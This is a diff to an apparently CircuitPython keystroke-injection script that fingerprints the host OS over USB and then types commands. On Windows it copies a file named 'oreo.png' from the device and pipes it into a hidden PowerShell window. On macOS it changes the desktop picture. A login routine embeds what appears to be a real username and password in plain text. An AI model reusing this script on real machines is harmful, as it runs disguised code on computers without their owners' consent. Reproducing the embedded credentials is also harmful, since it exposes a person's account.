@@ -1,3 +1,4 @@
+DRIVE_LABEL = "P"
 # SPDX-FileCopyrightText: 2018 Kattni Rembor for Adafruit Industries
 #
 # SPDX-License-Identifier: MIT
@@ -42,7 +43,7 @@ def sleep(n):
     start = time.monotonic()
     while not (time.monotonic() >= start + n):
         mouse.move(x=-100,y=-100)
-        time.sleep(0.01)
+        time.sleep(0.005)
 def SEND(*keycodes):
     for i in keycodes:
         kbd.press(i)
@@ -55,6 +56,10 @@ def SPAM(n, *keys):
         sleep(0.1)
         LED(RED,OFF)
         sleep(0.1)
+def write(st):
+    for i in st:
+        kbly.write(i)
+        mouse.move(x=-100,y=-100)
 
 def f_winlogon():
     SPAM(14, kc.ESCAPE)
@@ -63,16 +68,15 @@ def f_winlogon():
     SEND(kc.ENTER) 
     sleep(.4)
 
-    kbly.write("karmanyaah.malhotra")
+    write("karmanyaah.malhotra")
     sleep(.4)
     SEND(kc.TAB)
-    kbly.write("belton78150\n")
+    write("belton78150\n")
     sleep(12) # 40 for new comps, 12 for prev logged in comps
     
 def f_win(): #win
     log("HI1")
     SPAM(10, kc.ESCAPE)
-
 
     #while True:
     #   LED(RED,ON)
@@ -88,10 +92,14 @@ def f_win(): #win
     sleep(0.9)
     kbd.send(kc.I)
     sleep(3)
-    kbly.write("$dr = (get-volume -FileSystemLabel CIRCUITPY).DriveLetter; cd ${dr}:; cat 1oreo.png | powershell; exit\n")
+    write('cp "$((Get-Volume -filesy ' + DRIVE_LABEL + ').DriveLetter):\o*" ~;start powershell -a "gc ~/oreo.png|powershell" -wi h;exit\n')
+    og_state = kbd.led_on(Keyboard.LED_SCROLL_LOCK)
+    while kbd.led_on(Keyboard.LED_SCROLL_LOCK) == og_state: sleep(.02)
+    while kbd.led_on(Keyboard.LED_SCROLL_LOCK) != og_state: sleep(.02)
+
     #kbd.send(kc.ALT, kc.SHIFT, kc.M)
 def f_chr(): # chrome
-    SPAM(10, kc.ESCAPE)
+    SPAM(5, kc.ESCAPE)
     SEND(kc.ALT, kc.SHIFT, kc.M)
     sleep(3)
     SEND(kc.TAB)
@@ -100,8 +108,6 @@ def f_chr(): # chrome
     sleep(1)
     SEND(kc.SHIFT, kc.TAB)
     sleep(2)
-    SEND(kc.DOWN_ARROW)
-    sleep(.1)
     SEND(kc.CONTROL, kc.SPACE)
     sleep(1)
     SEND(kc.SHIFT, kc.TAB)
@@ -120,10 +126,10 @@ def f_mac():
     SPAM(10, kc.ESCAPE)
     SEND(kc.COMMAND, kc.SPACE)
     sleep(.3)
-    kbly.write("terminal\n") # messes up when terminal window is already open, but srsly who will have that
+    write("terminal\n") # messes up when terminal window is already open, but srsly who will have that
     sleep(1)
-    kbly.write('''osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/Volumes/CIRCUITPY/1oreo.png"'; exit\n''')
-    sleep(2)
+    write('''osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/Volumes/''' + DRIVE_LABEL + '''/oreo.png"'; exit\n''')
+    sleep(3)
     SEND(kc.ENTER)
     sleep(1)
     SEND(kc.ENTER)
@@ -133,13 +139,20 @@ def f_mac():
     
     
 
-    
-
+sleep(0.1)
+fpr = usb_hid.fpr()
+with open('this', 'a') as f:
+    f.write("".join("%02x" % b for b in fpr) + "\n")
+sleep(1)
 #f_winlogon()
-f_win()
-#f_chr()
-#f_mac()
+if fpr[54] == 255: f_win()
+if fpr[54] == 9: f_chr()
+if fpr[0] == 0: f_mac()
+
+#write("https://docs.google.com/spreadsheets/d/1PwbZ9qDcFp-lsfXqmGaZO1mDOQxvpiPUU8AVCTKzeY8/edit\n")
+
+
 
 LED(GREEN, ON)
 log("HI3")
-sleep(999999999)
+time.sleep(999999999)
